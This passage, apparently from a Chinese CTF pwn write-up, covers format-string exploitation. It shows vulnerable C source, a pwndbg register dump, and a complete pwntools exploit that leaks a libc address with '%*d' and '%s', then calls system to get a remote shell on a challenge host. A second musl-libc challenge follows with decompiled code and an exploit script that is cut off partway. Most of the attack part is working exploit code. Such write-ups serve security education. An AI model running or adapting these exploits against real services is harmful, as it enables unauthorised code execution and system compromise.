+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">do_printf</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">char</span> buf[<span class="number">4</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">scanf</span>(<span class="string">&quot;%3s&quot;</span>, buf) &lt;= <span class="number">0</span>)</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Here: &quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(buf);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">do_call</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">void</span> (*ptr)(<span class="type">const</span> <span class="type">char</span> *);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">scanf</span>(<span class="string">&quot;%p&quot;</span>, &amp;ptr) &lt;= <span class="number">0</span>)</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    ptr(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> choice;</span><br><span class="line"></span><br><span class="line">    setvbuf(<span class="built_in">stdin</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">    setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;1. printf&quot;</span>);</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;2. call&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;choice) &lt;= <span class="number">0</span>)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">switch</span> (choice)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">                do_printf();</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">                do_call();</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">default</span>:</span><br><span class="line">                <span class="built_in">puts</span>(<span class="string">&quot;Invalid choice!&quot;</span>);</span><br><span class="line">                <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>程序的输入只有三个字节，只需要泄露libc的地址就可以通过do_call去getshell，”%*d”表达式有两个参数一个是打印的宽度，另一个是打印的字符，printf(“% *d”, 5, 42); 这里rsi是宽度 rdx是打印的数字</p>
+<p>在第一次do_printf的时候 printf(“Here: “); rsi残留了一个printf缓冲区的地址，这个地址被当成了宽度，在解析格式化字符串的时候printf的缓冲区被写满了字符，第二个do_printf的时候，通过 %s可以将printf缓冲区的内容泄露出来，缓冲区结尾有libc的地址，所以可以通过这种方式去泄露libc</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; </span><br><span class="line">0x00005d8dccc20236 in do_printf ()</span><br><span class="line">LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA</span><br><span class="line">───────────────────────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]───────────────────────────────────────</span><br><span class="line">*RAX  0x0</span><br><span class="line"> RBX  0x5d8dccc203b0 (__libc_csu_init) ◂— endbr64 </span><br><span class="line"> RCX  0x0</span><br><span class="line"> RDX  0x0</span><br><span class="line"> RDI  0x5d8dccc21008 ◂— 0x2500203a65726548 /* &#x27;Here: &#x27; */</span><br><span class="line"> RSI  0x4</span><br><span class="line"> R8   0x64</span><br><span class="line"> R9   0x0</span><br><span class="line"> R10  0x5d8dccc21004 ◂— 0x6572654800733325 /* &#x27;%3s&#x27; */</span><br><span class="line"> R11  0x246</span><br><span class="line"> R12  0x5d8dccc20100 (_start) ◂— endbr64 </span><br><span class="line"> R13  0x7ffe4c726f90 ◂— 0x1</span><br><span class="line"> R14  0x0</span><br><span class="line"> R15  0x0</span><br><span class="line"> RBP  0x7ffe4c726e80 —▸ 0x7ffe4c726ea0 ◂— 0x0</span><br><span class="line"> RSP  0x7ffe4c726e70 ◂— 0x642a25ccc20100</span><br><span class="line">*RIP  0x5d8dccc20236 (do_printf+77) ◂— call 0x5d8dccc200c0</span><br><span class="line">────────────────────────────────────────────────[ DISASM / x86-64 / set emulate on ]────────────────────────────────────────────────</span><br><span class="line">   0x5d8dccc20217 &lt;do_printf+46&gt;    call   __isoc99_scanf@plt                &lt;__isoc99_scanf@plt&gt;</span><br><span class="line"> </span><br><span class="line">   0x5d8dccc2021c &lt;do_printf+51&gt;    test   eax, eax</span><br><span class="line">   0x5d8dccc2021e &lt;do_printf+53&gt;    jg     do_printf+65                &lt;do_printf+65&gt;</span><br><span class="line">    ↓</span><br><span class="line">   0x5d8dccc2022a &lt;do_printf+65&gt;    lea    rdi, [rip + 0xdd7]</span><br><span class="line">   0x5d8dccc20231 &lt;do_printf+72&gt;    mov    eax, 0</span><br><span class="line"> ► 0x5d8dccc20236 &lt;do_printf+77&gt;    call   printf@plt                &lt;printf@plt&gt;</span><br><span class="line">        format: 0x5d8dccc21008 ◂— 0x2500203a65726548 /* &#x27;Here: &#x27; */</span><br><span class="line">        vararg: 0x4</span><br><span class="line"> </span><br><span class="line">   0x5d8dccc2023b &lt;do_printf+82&gt;    lea    rax, [rbp - 0xc]</span><br><span class="line">   0x5d8dccc2023f &lt;do_printf+86&gt;    mov    rdi, rax</span><br><span class="line">   0x5d8dccc20242 &lt;do_printf+89&gt;    mov    eax, 0</span><br><span class="line">   0x5d8dccc20247 &lt;do_printf+94&gt;    call   printf@plt                &lt;printf@plt&gt;</span><br><span class="line"> </span><br><span class="line">   0x5d8dccc2024c &lt;do_printf+99&gt;    nop    </span><br><span class="line">─────────────────────────────────────────────────────────────[ STACK ]──────────────────────────────────────────────────────────────</span><br><span class="line">00:0000│ rsp 0x7ffe4c726e70 ◂— 0x642a25ccc20100</span><br><span class="line">01:0008│     0x7ffe4c726e78 ◂— 0xace6cc258ec17700</span><br><span class="line">02:0010│ rbp 0x7ffe4c726e80 —▸ 0x7ffe4c726ea0 ◂— 0x0</span><br><span class="line">03:0018│     0x7ffe4c726e88 —▸ 0x5d8dccc2036c (main+164) ◂— jmp 0x5d8dccc20390</span><br><span class="line">04:0020│     0x7ffe4c726e90 ◂— 0x14c726f90</span><br><span class="line">05:0028│     0x7ffe4c726e98 ◂— 0xace6cc258ec17700</span><br><span class="line">06:0030│     0x7ffe4c726ea0 ◂— 0x0</span><br><span class="line">07:0038│     0x7ffe4c726ea8 —▸ 0x7d2bbe226083 (__libc_start_main+243) ◂— mov edi, eax</span><br><span class="line">───────────────────────────────────────────────────────────[ BACKTRACE ]────────────────────────────────────────────────────────────</span><br><span class="line"> ► 0   0x5d8dccc20236 do_printf+77</span><br><span class="line">   1   0x5d8dccc2036c main+164</span><br><span class="line">   2   0x7d2bbe226083 __libc_start_main+243</span><br><span class="line">   3   0x5d8dccc2012e _start+46</span><br><span class="line">───────────────────────────</span><br></pre></td></tr></table></figure>
+
+<p>exp</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment"># from LibcSearcher import *</span></span><br><span class="line"><span class="keyword">import</span> itertools</span><br><span class="line"><span class="keyword">import</span> ctypes</span><br><span class="line"></span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line"><span class="comment"># log_level=&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">is_debug = <span class="number">0</span></span><br><span class="line">IP = <span class="string">&quot;be.ax&quot;</span></span><br><span class="line">PORT = <span class="number">32323</span></span><br><span class="line"></span><br><span class="line">elf = context.binary = ELF(<span class="string">&#x27;./chal&#x27;</span>)</span><br><span class="line">libc = elf.libc</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">connect</span>():</span><br><span class="line">    <span class="keyword">return</span> remote(IP, PORT) <span class="keyword">if</span> <span class="keyword">not</span> is_debug <span class="keyword">else</span> process()</span><br><span class="line"></span><br><span class="line">g = <span class="keyword">lambda</span> x: gdb.attach(x)</span><br><span class="line">s = <span class="keyword">lambda</span> x: p.send(x)</span><br><span class="line">sl = <span class="keyword">lambda</span> x: p.sendline(x)</span><br><span class="line">sa = <span class="keyword">lambda</span> x, y: p.sendafter(x, y)</span><br><span class="line">sla = <span class="keyword">lambda</span> x, y: p.sendlineafter(x, y)</span><br><span class="line">r = <span class="keyword">lambda</span> x=<span class="literal">None</span>: p.recv() <span class="keyword">if</span> x <span class="keyword">is</span> <span class="literal">None</span> <span class="keyword">else</span> p.recv(x)</span><br><span class="line">rl = <span class="keyword">lambda</span>: p.recvline()</span><br><span class="line">ru = <span class="keyword">lambda</span> x: p.recvuntil(x)</span><br><span class="line">r_leak_libc_64 = <span class="keyword">lambda</span>: u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">r_leak_libc_32 = <span class="keyword">lambda</span>: u32(p.recvuntil(<span class="string">b&#x27;\xf7&#x27;</span>)[-<span class="number">4</span>:])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">create_ucontext</span>(<span class="params"></span></span><br><span class="line"><span class="params">    src: <span class="built_in">int</span>,</span></span><br><span class="line"><span class="params">    rsp=<span class="number">0</span>,</span></span><br><span class="line"><span class="params">    rbx=<span class="number">0</span>,</span></span><br><span class="line"><span class="params">    rbp=<span class="number">0</span>,</span></span><br><span class="line"><span class="params">    r12=<span class="number">0</span>,</span></span><br><span class="line"><span class="params">    r13=<span class="number">0</span>,</span></span><br><span class="line"><span class="params">    r14=<span class="number">0</span>,</span></span><br><span class="line"><span class="params">    r15=<span class="number">0</span>,</span></span><br><span class="line"><span class="params">    rsi=<span class="number">0</span>,</span></span><br><span class="line"><span class="params">    rdi=<span class="number">0</span>,</span></span><br><span class="line"><span class="params">    rcx=<span class="number">0</span>,</span></span><br><span class="line"><span class="params">    r8=<span class="number">0</span>,</span></span><br><span class="line"><span class="params">    r9=<span class="number">0</span>,</span></span><br><span class="line"><span class="params">    rdx=<span class="number">0</span>,</span></span><br><span class="line"><span class="params">    rip=<span class="number">0xDEADBEEF</span>,</span></span><br><span class="line"><span class="params"></span>) -&gt; <span class="built_in">bytearray</span>:</span><br><span class="line">    b = <span class="built_in">bytearray</span>(<span class="number">0x200</span>)</span><br><span class="line">    b[<span class="number">0xE0</span>:<span class="number">0xE8</span>] = p64(src)  <span class="comment"># fldenv ptr</span></span><br><span class="line">    b[<span class="number">0x1C0</span>:<span class="number">0x1C8</span>] = p64(<span class="number">0x1F80</span>)  <span class="comment"># ldmxcsr</span></span><br><span class="line"></span><br><span class="line">    b[<span class="number">0xA0</span>:<span class="number">0xA8</span>] = p64(rsp)</span><br><span class="line">    b[<span class="number">0x80</span>:<span class="number">0x88</span>] = p64(rbx)</span><br><span class="line">    b[<span class="number">0x78</span>:<span class="number">0x80</span>] = p64(rbp)</span><br><span class="line">    b[<span class="number">0x48</span>:<span class="number">0x50</span>] = p64(r12)</span><br><span class="line">    b[<span class="number">0x50</span>:<span class="number">0x58</span>] = p64(r13)</span><br><span class="line">    b[<span class="number">0x58</span>:<span class="number">0x60</span>] = p64(r14)</span><br><span class="line">    b[<span class="number">0x60</span>:<span class="number">0x68</span>] = p64(r15)</span><br><span class="line"></span><br><span class="line">    b[<span class="number">0xA8</span>:<span class="number">0xB0</span>] = p64(rip)  <span class="comment"># ret ptr</span></span><br><span class="line">    b[<span class="number">0x70</span>:<span class="number">0x78</span>] = p64(rsi)</span><br><span class="line">    b[<span class="number">0x68</span>:<span class="number">0x70</span>] = p64(rdi)</span><br><span class="line">    b[<span class="number">0x98</span>:<span class="number">0xA0</span>] = p64(rcx)</span><br><span class="line">    b[<span class="number">0x28</span>:<span class="number">0x30</span>] = p64(r8)</span><br><span class="line">    b[<span class="number">0x30</span>:<span class="number">0x38</span>] = p64(r9)</span><br><span class="line">    b[<span class="number">0x88</span>:<span class="number">0x90</span>] = p64(rdx)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> b</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">setcontext32</span>(<span class="params">libc: ELF, **kwargs</span>) -&gt; (<span class="built_in">int</span>, <span class="built_in">bytes</span>):</span><br><span class="line">    got = libc.address + libc.dynamic_value_by_tag(<span class="string">&quot;DT_PLTGOT&quot;</span>)</span><br><span class="line">    plt_trampoline = libc.address + libc.get_section_by_name(<span class="string">&quot;.plt&quot;</span>).header.sh_addr</span><br><span class="line">    <span class="keyword">return</span> got, flat(</span><br><span class="line">        p64(<span class="number">0</span>),</span><br><span class="line">        p64(got + <span class="number">0x218</span>),</span><br><span class="line">        p64(libc.symbols[<span class="string">&quot;setcontext&quot;</span>] + <span class="number">32</span>),</span><br><span class="line">        p64(plt_trampoline) * <span class="number">0x40</span>,</span><br><span class="line">        create_ucontext(got + <span class="number">0x218</span>, rsp=libc.symbols[<span class="string">&quot;environ&quot;</span>] + <span class="number">8</span>, **kwargs),</span><br><span class="line">    )</span><br><span class="line"><span class="comment"># e.g. dest, payload = setcontext32.setcontext32(</span></span><br><span class="line"><span class="comment">#         libc, rip=libc.sym[&quot;system&quot;], rdi=libc.search(b&quot;/bin/sh&quot;).__next__()</span></span><br><span class="line"><span class="comment">#     )</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p = connect()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">print_data</span>(<span class="params">data</span>):</span><br><span class="line">    sl(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">    sl(data)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">call_addr</span>(<span class="params">addr</span>):</span><br><span class="line">    sl(<span class="string">&quot;2&quot;</span>)</span><br><span class="line">    sl(<span class="built_in">hex</span>(addr).encode())</span><br><span class="line"></span><br><span class="line">print_data(<span class="string">&quot;%*d&quot;</span>)</span><br><span class="line">print_data(<span class="string">&quot;%s&quot;</span>)</span><br><span class="line"></span><br><span class="line">system = u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>)) - <span class="number">0x19a6f0</span></span><br><span class="line">call_addr(system)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="musl-libc中的格式化字符串-和禁用-差不多"><a href="#musl-libc中的格式化字符串-和禁用-差不多" class="headerlink" title="musl libc中的格式化字符串 (和禁用$差不多)"></a>musl libc中的格式化字符串 (和禁用$差不多)</h2><p>crewctf_Format muscle</p>
+<p>使用musl libc动态连接</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl __noreturn <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> s[<span class="number">264</span>]; <span class="comment">// [rsp+0h] [rbp-110h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v4; <span class="comment">// [rsp+108h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v4 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  setbuf((FILE *)&amp;dword_0, <span class="number">0LL</span>);</span><br><span class="line">  <span class="keyword">do</span></span><br><span class="line">  &#123;</span><br><span class="line">    fgets(s, <span class="number">256</span>, (FILE *)&amp;dword_0);</span><br><span class="line">    <span class="built_in">printf</span>(s);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span> ( <span class="built_in">strncmp</span>(s, <span class="string">&quot;quit&quot;</span>, <span class="number">4uLL</span>) );</span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>musl libc中没有glibc里 %10$n这样的位置描述符，所以在不使用位置描述符的情况下去实现任意地址读写的原语，可以填充大量的%c去替代idx来实现任意地址读写的</p>
+<p>exp</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment"># from LibcSearcher import *</span></span><br><span class="line"><span class="keyword">import</span> itertools</span><br><span class="line"><span class="keyword">import</span> ctypes</span><br><span class="line"></span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line">is_debug = <span class="number">1</span></span><br><span class="line">IP = <span class="string">&quot;47.100.139.115&quot;</span></span><br><span class="line">PORT = <span class="number">30708</span></span><br><span class="line"></span><br><span class="line">elf = context.binary = ELF(<span class="string">&#x27;./format-muscle&#x27;</span>)</span><br><span class="line"><span class="comment"># libc = elf.libc</span></span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">connect</span>():</span><br><span class="line">    <span class="keyword">return</span> remote(IP, PORT) <span class="keyword">if</span> <span class="keyword">not</span> is_debug <span class="keyword">else</span> process()</span><br><span class="line"></span><br><span class="line">g = <span class="keyword">lambda</span> x: gdb.attach(x)</span><br><span class="line">s = <span class="keyword">lambda</span> x: p.send(x)</span><br><span class="line">sl = <span class="keyword">lambda</span> x: p.sendline(x)</span><br><span class="line">sa = <span class="keyword">lambda</span> x, y: p.sendafter(x, y)</span><br><span class="line">sla = <span class="keyword">lambda</span> x, y: p.sendlineafter(x, y)</span><br><span class="line">r = <span class="keyword">lambda</span> x=<span class="literal">None</span>: p.recv() <span class="keyword">if</span> x <span class="keyword">is</span> <span class="literal">None</span> <span class="keyword">else</span> p.recv(x)</span><br><span class="line">rl = <span class="keyword">lambda</span>: p.recvline()</span><br><span class="line">ru = <span class="keyword">lambda</span> x: p.recvuntil(x)</span><br><span class="line">r_leak_libc_64 = <span class="keyword">lambda</span>: u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">r_leak_libc_32 = <span class="keyword">lambda</span>: u32(p.recvuntil(<span class="string">b&#x27;\xf7&#x27;</span>)[-<span class="number">4</span>:])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">create_ucontext</span>(<span class="params"></span></span><br><span class="line"><span class="params">    src: <span class="built_in">int</span>,</span></span><br><span class="line"><span class="params">    rsp=<span class="number">0</span>,</span></span><br><span class="line"><span class="params">    rbx=<span class="number">0</span>,</span></span><br><span class="line"><span class="params">    rbp=<span class="number">0</span>,</span></span><br><span class="line"><span class="params">    r12=<span class="number">0</span>,</span></span><br><span class="line"><span class="params">    r13=<span class="number">0</span>,</span></span><br><span class="line"><span class="params">    r14=<span class="number">0</span>,</span></span><br><span class="line"><span class="params">    r15=<span class="number">0</span>,</span></span><br><span class="line"><span class="params">    rsi=<span class="number">0</span>,</span></span><br><span class="line"><span class="params">    rdi=<span class="number">0</span>,</span></span><br><span class="line"><span class="params">    rcx=<span class="number">0</span>,</span></span><br><span class="line"><span class="params">    r8=<span class="number">0</span>,</span></span><br><span class="line"><span class="params">    r9=<span class="number">0</span>,</span></span><br><span class="line"><span class="params">    rdx=<span class="number">0</span>,</span></span><br><span class="line"><span class="params">    rip=<span class="number">0xDEADBEEF</span>,</span></span><br><span class="line"><span class="params"></span>) -&gt; <span class="built_in">bytearray</span>:</span><br><span class="line">    b = <span class="built_in">bytearray</span>(<span class="number">0x200</span>)</span><br><span class="line">    b[<span class="number">0xE0</span>:<span class="number">0xE8</span>] = 